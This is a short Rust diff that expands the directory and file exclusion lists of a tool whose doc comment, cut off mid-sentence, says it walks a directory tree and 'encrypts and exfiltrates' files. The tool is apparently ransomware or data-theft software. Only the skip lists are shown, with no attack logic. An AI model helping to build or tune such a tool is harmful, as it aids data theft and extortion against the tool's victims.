@@ -17,8 +17,33 @@ use crate::{
 // Slices are used to avoid informing the number of elements of an array
 // Avoiding Vec for better performance, no dynamic allocation--heap
 /// Permanent, read-only lists that contain permanent, read-only string references
-const EXCLUDED_DIRS: &'static [&'static str] = &[".git", "bin", ".cache"];
-const EXCLUDED_FILES: &'static [&'static str] = &[".dmg", ".tmp", ".DS_Store"];
+const EXCLUDED_DIRS: &'static [&'static str] = &[
+    ".git",
+    ".svn",
+    "node_modules",
+    "target",
+    "__pycache__",
+    ".idea",
+    ".vscode",
+    ".Spotlight-V100",
+    ".Trashes",
+    ".fseventsd",
+];
+const EXCLUDED_FILES: &'static [&'static str] = &[
+    ".zombie",
+    ".DS_Store",
+    ".AppleDouble",
+    ".LSOverride",
+    ".VolumeIcon.icns",
+    ".apdisk",
+    ".metadata_never_index",
+    ".dmg",
+    ".pkg",
+    ".tmp",
+    ".bak",
+    ".swp",
+    ".swo",
+];
 
 /// Walks a directory tree starting from `path`, excluding directories
 /// and files based on predefined lists, and encrypts and exfiltrates
